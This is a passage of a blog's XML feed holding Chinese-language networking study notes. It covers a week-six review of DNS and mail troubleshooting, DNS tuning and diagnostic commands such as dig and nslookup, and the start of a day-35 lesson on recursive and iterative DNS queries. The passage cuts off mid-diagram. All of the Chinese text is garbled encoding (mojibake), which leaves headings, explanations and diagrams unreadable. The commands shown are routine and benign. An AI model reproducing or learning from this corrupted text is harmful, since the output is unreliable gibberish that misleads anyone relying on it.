title="å¸¸è§é—®é¢˜è§£å†³"></a>å¸¸è§é—®é¢˜è§£å†³</h2><h3 id="DNSé—®é¢˜"><a href="#DNSé—®é¢˜" class="headerlink" title="DNSé—®é¢˜"></a>DNSé—®é¢˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é—®é¢˜ï¼šDNSè§£ææ…¢<br>è§£å†³ï¼š<br><span class="hljs-bullet">1.</span> æ›´æ¢å¿«é€ŸDNSï¼ˆ8.8.8.8, 1.1.1.1ï¼‰<br><span class="hljs-bullet">2.</span> å¯ç”¨DNSç¼“å­˜<br><span class="hljs-bullet">3.</span> å‡å°‘TTLï¼ˆä¸´æ—¶ï¼‰<br><span class="hljs-bullet">4.</span> ä½¿ç”¨DoHåŠ å¯†æŸ¥è¯¢<br><br>é—®é¢˜ï¼šDNSåŠ«æŒ<br>è§£å†³ï¼š<br><span class="hljs-bullet">1.</span> ä½¿ç”¨DNSSEC<br><span class="hljs-bullet">2.</span> ä½¿ç”¨DoH/DoT<br><span class="hljs-bullet">3.</span> éªŒè¯DNSå“åº”<br></code></pre></td></tr></table></figure><h3 id="é‚®ä»¶é—®é¢˜"><a href="#é‚®ä»¶é—®é¢˜" class="headerlink" title="é‚®ä»¶é—®é¢˜"></a>é‚®ä»¶é—®é¢˜</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é—®é¢˜ï¼šé‚®ä»¶å‘é€å¤±è´¥<br>æ£€æŸ¥ï¼š<br><span class="hljs-bullet">1.</span> SMTPæœåŠ¡å™¨åœ°å€å’Œç«¯å£<br><span class="hljs-bullet">2.</span> è®¤è¯ä¿¡æ¯<br><span class="hljs-bullet">3.</span> TLS/SSLè®¾ç½®<br><span class="hljs-bullet">4.</span> SPF/DKIM/DMARCé…ç½®<br></code></pre></td></tr></table></figure><hr><h2 id="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"><a href="#æ€§èƒ½ä¼˜åŒ–æŠ€å·§" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2><h3 id="DNSä¼˜åŒ–"><a href="#DNSä¼˜åŒ–" class="headerlink" title="DNSä¼˜åŒ–"></a>DNSä¼˜åŒ–</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä½¿ç”¨å¿«é€ŸDNSæœåŠ¡å™¨<br><span class="hljs-bullet">   -</span> Google: 8.8.8.8<br><span class="hljs-bullet">   -</span> Cloudflare: 1.1.1.1<br><span class="hljs-bullet">   -</span> é˜¿é‡Œ: 223.5.5.5<br><br><span class="hljs-bullet">2.</span> åˆç†è®¾ç½®TTL<br><span class="hljs-bullet">   -</span> ç¨³å®šè®°å½•ï¼š3600-86400ç§’<br><span class="hljs-bullet">   -</span> å˜åŒ–è®°å½•ï¼š300-600ç§’<br><br><span class="hljs-bullet">3.</span> å¯ç”¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> æµè§ˆå™¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> OSç¼“å­˜<br><span class="hljs-bullet">   -</span> åº”ç”¨ç¼“å­˜<br><br><span class="hljs-bullet">4.</span> é¢„è§£æ<br>   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//example.com&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="åè®®é€‰æ‹©"><a href="#åè®®é€‰æ‹©" class="headerlink" title="åè®®é€‰æ‹©"></a>åè®®é€‰æ‹©</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Webåº”ç”¨ï¼š<br><span class="hljs-bullet">- </span>HTTP/2 æˆ– HTTP/3<br><span class="hljs-bullet">- </span>å¯ç”¨gzipå‹ç¼©<br><span class="hljs-bullet">- </span>ä½¿ç”¨CDN<br><br>æ–‡ä»¶ä¼ è¾“ï¼š<br><span class="hljs-bullet">- </span>å°æ–‡ä»¶ï¼šHTTP<br><span class="hljs-bullet">- </span>å¤§æ–‡ä»¶ï¼šFTP/SFTP<br><span class="hljs-bullet">- </span>å®‰å…¨ä¼ è¾“ï¼šSFTP<br><br>å®æ—¶é€šä¿¡ï¼š<br><span class="hljs-bullet">- </span>WebSocket<br><span class="hljs-bullet">- </span>Server-Sent Events<br></code></pre></td></tr></table></figure><hr><h2 id="å®ç”¨å·¥å…·"><a href="#å®ç”¨å·¥å…·" class="headerlink" title="å®ç”¨å·¥å…·"></a>å®ç”¨å·¥å…·</h2><h3 id="DNSå·¥å…·"><a href="#DNSå·¥å…·" class="headerlink" title="DNSå·¥å…·"></a>DNSå·¥å…·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥è¯¢DNS</span><br>nslookup www.example.com<br>dig www.example.com<br>host www.example.com<br><br><span class="hljs-comment"># è¿½è¸ªDNSæŸ¥è¯¢</span><br>dig +trace www.example.com<br><br><span class="hljs-comment"># æŸ¥çœ‹DNSç¼“å­˜</span><br><span class="hljs-comment"># Windows</span><br>ipconfig /displaydns<br><span class="hljs-comment"># Linux</span><br>systemd-resolve --statistics<br></code></pre></td></tr></table></figure><h3 id="ç½‘ç»œè¯Šæ–­"><a href="#ç½‘ç»œè¯Šæ–­" class="headerlink" title="ç½‘ç»œè¯Šæ–­"></a>ç½‘ç»œè¯Šæ–­</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æµ‹è¯•è¿é€šæ€§</span><br>ping example.com<br>telnet smtp.example.com 25<br><br><span class="hljs-comment"># æŸ¥çœ‹DNSè§£æ</span><br>dig @8.8.8.8 example.com<br>nslookup example.com 1.1.1.1<br></code></pre></td></tr></table></figure><hr><h2 id="ä¸‹å‘¨é¢„å‘Š"><a href="#ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="ä¸‹å‘¨é¢„å‘Š"></a>ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬ä¸ƒå‘¨ï¼šTCPæ·±å…¥åˆ†æï¼ˆDay 41-47ï¼‰</strong></p><p>å­¦ä¹ å†…å®¹ï¼š</p><ul><li>TCPä¸‰æ¬¡æ¡æ‰‹è¯¦è§£</li><li>TCPå››æ¬¡æŒ¥æ‰‹å’ŒçŠ¶æ€æœº</li><li>æ»‘åŠ¨çª—å£å’Œæµé‡æ§åˆ¶</li><li>æ‹¥å¡æ§åˆ¶ç®—æ³•</li><li>TCPæ€§èƒ½ä¼˜åŒ–</li><li>å®æˆ˜é¡¹ç›®</li></ul><p>é‡ç‚¹ï¼š</p><ul><li>æ·±å…¥ç†è§£TCPå¯é æ€§æœºåˆ¶</li><li>æŒæ¡TCPæ€§èƒ½è°ƒä¼˜</li><li>ç†è§£Linuxç½‘ç»œæ ˆ</li></ul><hr><h2 id="å­¦ä¹ å»ºè®®"><a href="#å­¦ä¹ å»ºè®®" class="headerlink" title="å­¦ä¹ å»ºè®®"></a>å­¦ä¹ å»ºè®®</h2><h3 id="å¿…é¡»æŒæ¡"><a href="#å¿…é¡»æŒæ¡" class="headerlink" title="å¿…é¡»æŒæ¡"></a>å¿…é¡»æŒæ¡</h3><ol><li>âœ… DNSå®Œæ•´æŸ¥è¯¢æµç¨‹</li><li>âœ… å¸¸è§DNSè®°å½•ç±»å‹</li><li>âœ… HTTP&#x2F;HTTPSå·¥ä½œåŸç†</li><li>âœ… é‚®ä»¶åè®®åŸºç¡€</li></ol><h3 id="å®è·µä»»åŠ¡"><a href="#å®è·µä»»åŠ¡" class="headerlink" title="å®è·µä»»åŠ¡"></a>å®è·µä»»åŠ¡</h3><ul><li><input disabled="" type="checkbox"> æ­å»ºæœ¬åœ°DNSæœåŠ¡å™¨</li><li><input disabled="" type="checkbox"> å®ç°FTPå®¢æˆ·ç«¯</li><li><input disabled="" type="checkbox"> å‘é€SMTPé‚®ä»¶</li><li><input disabled="" type="checkbox"> åˆ†æDNSæµé‡</li></ul><h3 id="æ‰©å±•å­¦ä¹ "><a href="#æ‰©å±•å­¦ä¹ " class="headerlink" title="æ‰©å±•å­¦ä¹ "></a>æ‰©å±•å­¦ä¹ </h3><ul><li>RFC 1035: DNSåè®®è§„èŒƒ</li><li>RFC 4033-4035: DNSSEC</li><li>RFC 5321: SMTP</li><li>RFC 3501: IMAP</li></ul><hr><p><strong>è¿›åº¦ï¼š40&#x2F;120å¤©ï¼ˆ33.3%ï¼‰</strong></p><p>ç¬¬å…­å‘¨å®Œæˆï¼åº”ç”¨å±‚åè®®å­¦ä¹ åœ†æ»¡ç»“æŸï¼</p><p>ä¸‹å‘¨è¿›å…¥ä¼ è¾“å±‚æ·±å…¥å­¦ä¹ ï¼Œæ•¬è¯·æœŸå¾…ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>35å¤©ï¼šDNSæ·±å…¥ - é€’å½’ä¸è¿­ä»£æŸ¥è¯¢</title>
    <link href="/2025/11/10/35%E5%A4%A9%EF%BC%9ADNS%E6%B7%B1%E5%85%A5%20-%20%E9%80%92%E5%BD%92%E4%B8%8E%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2/"/>
    <url>/2025/11/10/35%E5%A4%A9%EF%BC%9ADNS%E6%B7%B1%E5%85%A5%20-%20%E9%80%92%E5%BD%92%E4%B8%8E%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬35å¤©ï¼šDNSæ·±å…¥-é€’å½’ä¸è¿­ä»£æŸ¥è¯¢"><a href="#ç¬¬35å¤©ï¼šDNSæ·±å…¥-é€’å½’ä¸è¿­ä»£æŸ¥è¯¢" class="headerlink" title="ç¬¬35å¤©ï¼šDNSæ·±å…¥ - é€’å½’ä¸è¿­ä»£æŸ¥è¯¢"></a>ç¬¬35å¤©ï¼šDNSæ·±å…¥ - é€’å½’ä¸è¿­ä»£æŸ¥è¯¢</h1><blockquote><p>â€œDNSå°±åƒäº’è”ç½‘çš„ç”µè¯ç°¿ï¼Œå°†åŸŸåç¿»è¯‘æˆIPåœ°å€ï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡"><a href="#ğŸ“š-ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ğŸ“š ä»Šæ—¥ç›®æ ‡"></a>ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>æ·±å…¥ç†è§£DNSå·¥ä½œåŸç†</li><li>æŒæ¡é€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢</li><li>å­¦ä¹ DNSè®°å½•ç±»å‹</li><li>ç†è§£DNSç¼“å­˜æœºåˆ¶</li><li>å®ç°DNSæŸ¥è¯¢å·¥å…·</li></ul><hr><h2 id="1-DNSåŸºç¡€å›é¡¾"><a href="#1-DNSåŸºç¡€å›é¡¾" class="headerlink" title="1. DNSåŸºç¡€å›é¡¾"></a>1. DNSåŸºç¡€å›é¡¾</h2><h3 id="1-1-DNSæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-1-DNSæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.1 DNSæ˜¯ä»€ä¹ˆï¼Ÿ"></a>1.1 DNSæ˜¯ä»€ä¹ˆï¼Ÿ</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DNS (Domain Name System) - åŸŸåç³»ç»Ÿ<br><br>ä½œç”¨ï¼šå°†äººç±»å¯è¯»çš„åŸŸåè½¬æ¢ä¸ºæœºå™¨å¯è¯»çš„IPåœ°å€<br><br>ç¤ºä¾‹ï¼š<br>www.example.com  â†’  <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>ç”Ÿæ´»åŒ–ç±»æ¯”ï¼š<br><span class="hljs-attribute">DNS</span> <span class="hljs-operator">=</span> ç”µè¯ç°¿<br>åŸŸå <span class="hljs-operator">=</span> äººåï¼ˆå¼ ä¸‰ï¼‰<br>IPåœ°å€ <span class="hljs-operator">=</span> ç”µè¯å·ç ï¼ˆ<span class="hljs-number">138</span>-xxxx-xxxxï¼‰<br><br>ä½ è®°å¾—ä½<span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>ï¼Œä½†è®°ä¸ä½ä»–çš„ç”µè¯å·ç <br>DNSå¸®ä½ æŠŠ<span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>ç¿»è¯‘æˆå…·ä½“çš„ç”µè¯å·ç <br></code></pre></td></tr></table></figure><h3 id="1-2-ä¸ºä»€ä¹ˆéœ€è¦DNSï¼Ÿ"><a href="#1-2-ä¸ºä»€ä¹ˆéœ€è¦DNSï¼Ÿ" class="headerlink" title="1.2 ä¸ºä»€ä¹ˆéœ€è¦DNSï¼Ÿ"></a>1.2 ä¸ºä»€ä¹ˆéœ€è¦DNSï¼Ÿ</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs armasm">é—®é¢˜ï¼šå¦‚æœæ²¡æœ‰DNS<br><br>è®¿é—®ç½‘ç«™éœ€è¦è®°ä½<span class="hljs-built_in">IP</span>åœ°å€ï¼š<br>- è®¿é—®ç™¾åº¦ï¼š<span class="hljs-number">39</span>.<span class="hljs-number">156</span>.<span class="hljs-number">66</span>.<span class="hljs-number">10</span><br>- è®¿é—®è°·æ­Œï¼š<span class="hljs-number">172</span>.<span class="hljs-number">217</span>.<span class="hljs-number">160</span>.<span class="hljs-number">68</span><br>- è®¿é—®GitHubï¼š<span class="hljs-number">20</span>.<span class="hljs-number">205</span>.<span class="hljs-number">243</span>.<span class="hljs-number">166</span><br><br>ç¼ºç‚¹ï¼š<br>âŒ <span class="hljs-built_in">IP</span>åœ°å€éš¾è®°<br>âŒ <span class="hljs-built_in">IP</span>åœ°å€ä¼šå˜åŒ–<br>âŒ æ— æ³•ä½¿ç”¨æœ‰æ„ä¹‰çš„åç§°<br><br>æœ‰äº†DNSï¼š<br>âœ… è®°ä½åŸŸåå³å¯ï¼šwww.baidu.com<br>âœ… <span class="hljs-built_in">IP</span>å˜åŒ–å¯¹ç”¨æˆ·é€æ˜<br>âœ… åŸŸåæœ‰æ„ä¹‰ä¸”æ˜“è®°<br></code></pre></td></tr></table></figure><hr><h2 id="2-DNSå±‚çº§ç»“æ„"><a href="#2-DNSå±‚çº§ç»“æ„" class="headerlink" title="2. DNSå±‚çº§ç»“æ„"></a>2. DNSå±‚çº§ç»“æ„</h2><h3 id="2-1-DNSæ ‘çŠ¶ç»“æ„"><a href="#2-1-DNSæ ‘çŠ¶ç»“æ„" class="headerlink" title="2.1 DNSæ ‘çŠ¶ç»“æ„"></a>2.1 DNSæ ‘çŠ¶ç»“æ„</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNSå‘½åç©ºé—´æ˜¯ä¸€ä¸ªæ ‘çŠ¶å±‚çº§ç»“æ„ï¼š<br><br><span class="hljs-code">                    æ ¹åŸŸ (.)</span><br><span class="hljs-code">                      |</span><br><span class="hljs-code">    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">    |                 |                 |</span><br><span class="hljs-code">   com               org               cn</span><br><span class="hljs-code">    |                 |                 |</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”´â”€â”€â”€â”         â”Œâ”€â”€â”€â”´â”€â”€â”€â”         â”Œâ”€â”€â”€â”´â”€â”€â”€â”</span><br><span class="hljs-code">|       |         |       |         |       |</span><br><span class="hljs-code">example google   wikipedia ietf    baidu  163</span><br><span class="hljs-code">|</span><br><span class="hljs-code">www</span><br><span class="hljs-code"></span><br>å®Œæ•´åŸŸåï¼ˆFQDNï¼‰ï¼šwww.example.com.<br><span class="hljs-bullet">-</span> www: ä¸»æœºå<br><span class="hljs-bullet">-</span> example: äºŒçº§åŸŸå<br><span class="hljs-bullet">-</span> com: é¡¶çº§åŸŸåï¼ˆTLDï¼‰<br><span class="hljs-bullet">-</span> .: æ ¹åŸŸï¼ˆé€šå¸¸çœç•¥ï¼‰<br><br>åŸŸåå±‚çº§ï¼ˆä»å³åˆ°å·¦ï¼‰ï¼š<br><span class="hljs-bullet">1.</span> æ ¹åŸŸ (Root): .<br><span class="hljs-bullet">2.</span> é¡¶çº§åŸŸ (TLD): com, org, cn, net<br><span class="hljs-bullet">3.</span> äºŒçº§åŸŸ (SLD): example, google, baidu<br><span class="hljs-bullet">4.</span> å­åŸŸ (Subdomain): www, mail, ftp<br><br>å¸¸è§é¡¶çº§åŸŸåï¼š<br>é€šç”¨é¡¶çº§åŸŸï¼ˆgTLDï¼‰ï¼š<br><span class="hljs-bullet">-</span> .com: å•†ä¸š<br><span class="hljs-bullet">-</span> .org: ç»„ç»‡<br><span class="hljs-bullet">-</span> .net: ç½‘ç»œ<br><span class="hljs-bullet">-</span> .edu: æ•™è‚²<br><span class="hljs-bullet">-</span> .gov: æ”¿åºœ<br><br>å›½å®¶é¡¶çº§åŸŸï¼ˆccTLDï¼‰ï¼š<br><span class="hljs-bullet">-</span> .cn: ä¸­å›½<br><span class="hljs-bullet">-</span> .us: ç¾å›½<br><span class="hljs-bullet">-</span> .uk: è‹±å›½<br><span class="hljs-bullet">-</span> .jp: æ—¥æœ¬<br></code></pre></td></tr></table></figure><h3 id="2-2-DNSæœåŠ¡å™¨å±‚çº§"><a href="#2-2-DNSæœåŠ¡å™¨å±‚çº§" class="headerlink" title="2.2 DNSæœåŠ¡å™¨å±‚çº§"></a>2.2 DNSæœåŠ¡å™¨å±‚çº§</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs scss">DNSæœåŠ¡å™¨æ¶æ„ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æ ¹DNSæœåŠ¡å™¨ (Root DNS Servers)          â”‚<br>â”‚ - å…¨çƒ<span class="hljs-number">13</span>ä¸ªæ ¹æœåŠ¡å™¨é›†ç¾¤                   â”‚<br>â”‚ - çŸ¥é“æ‰€æœ‰TLDæœåŠ¡å™¨çš„ä½ç½®                â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ é¡¶çº§åŸŸDNSæœåŠ¡å™¨ (TLD DNS Servers)       â”‚<br>â”‚ - <span class="hljs-selector-class">.com</span>, <span class="hljs-selector-class">.org</span>, <span class="hljs-selector-class">.cn</span>ç­‰çš„æƒå¨æœåŠ¡å™¨         â”‚<br>â”‚ - çŸ¥é“å„è‡ªåŸŸä¸‹çš„æƒå¨æœåŠ¡å™¨ä½ç½®           â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æƒå¨DNSæœåŠ¡å™¨ (Authoritative Servers)   â”‚<br>â”‚ - å­˜å‚¨åŸŸåçš„å®é™…DNSè®°å½•                  â”‚<br>â”‚ - example<span class="hljs-selector-class">.com</span>çš„æƒå¨æœåŠ¡å™¨                â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>              â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨ (Local/Recursive Servers) â”‚<br>â”‚ - ISPæä¾›æˆ–è‡ªå·±é…ç½®                      â”‚<br>â”‚ - æ‰§è¡Œå®é™…çš„DNSæŸ¥è¯¢                      â”‚<br>â”‚ - ç¼“å­˜æŸ¥è¯¢ç»“æœ                           â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="3-DNSæŸ¥è¯¢ç±»å‹"><a href="#3-DNSæŸ¥è¯¢ç±»å‹" class="headerlink" title="3. DNSæŸ¥è¯¢ç±»å‹"></a>3. DNSæŸ¥è¯¢ç±»å‹</h2><h3 id="3-1-é€’å½’æŸ¥è¯¢ï¼ˆRecursive-Queryï¼‰"><a href="#3-1-é€’å½’æŸ¥è¯¢ï¼ˆRecursive-Queryï¼‰" class="headerlink" title="3.1 é€’å½’æŸ¥è¯¢ï¼ˆRecursive Queryï¼‰"></a>3.1 é€’å½’æŸ¥è¯¢ï¼ˆRecursive Queryï¼‰</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">é€’å½’æŸ¥è¯¢æµç¨‹ï¼š<br><br>å®¢æˆ·ç«¯åªéœ€è¦é—®ä¸€æ¬¡ï¼ŒDNSæœåŠ¡å™¨è´Ÿè´£å®Œæˆæ‰€æœ‰æŸ¥è¯¢<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å®¢æˆ·ç«¯  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">1</span>. æŸ¥è¯¢ www.example.<span class="hljs-keyword">com</span><br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚ â† é€’å½’æŸ¥è¯¢çš„æ ¸å¿ƒ<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">2</span>. æŸ¥è¯¢æ ¹æœåŠ¡å™¨<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  æ ¹DNSæœåŠ¡å™¨   â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">3</span>. è¿”å›.<span class="hljs-keyword">com</span>æœåŠ¡å™¨åœ°å€<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æœ¬åœ°DNSæœåŠ¡å™¨  â”‚<br>â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>     â”‚ <span class="hljs-number">4</span>. æŸ¥è¯¢.<span class="hljs-keyword">com</span>æœåŠ¡å™¨<br>     â†“<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ .<span 